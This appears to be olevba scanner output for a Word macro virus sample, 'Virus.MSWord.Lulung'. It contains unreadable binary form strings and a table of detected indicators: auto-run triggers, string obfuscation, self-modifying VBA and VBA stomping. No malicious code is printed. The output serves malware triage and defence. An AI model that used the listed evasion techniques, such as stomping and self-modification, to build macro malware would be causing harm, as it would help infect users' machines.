VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?��?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?�������������������������(
-------------------------------------------------------------------------------
VBA FORM Variable "b'OK'" IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image2'" IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Image1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

